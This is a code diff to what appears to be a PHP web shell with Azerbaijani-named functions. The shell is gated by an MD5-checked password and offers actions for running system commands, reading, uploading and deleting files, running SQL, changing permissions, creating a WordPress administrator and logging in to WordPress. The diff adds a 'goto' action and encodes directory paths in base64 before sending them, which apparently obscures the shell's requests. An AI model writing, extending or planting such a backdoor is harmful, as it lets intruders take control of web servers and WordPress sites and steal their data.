@@ -16,7 +16,7 @@ if ($password != md5($_GET['password'])) {
 }
 $baqliFunksiyalar = explode(",", "");
 $safeMode = true;
-$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','set_manual_wp_load','create_st_folder','create_shb_file','chmod','chmod_folder');
+$actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl','set_wp_load','create_wp_admin','login_wp','set_manual_wp_load','create_st_folder','create_shb_file','chmod','chmod_folder','goto');
 $ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas";
 function listDrives() {
     $drives = [];
@@ -1187,7 +1187,8 @@ function goto()
 	var dir = prompt('Dir:');
 	if( dir )
 	{
-		sehife("?qovluq=" + dir);
+		var url = encodeURIComponent(encodeURIComponent(btoa(dir)));
+		sehife('?qovluq=' + url);
 	}
 }
 function ziple(qovluq)
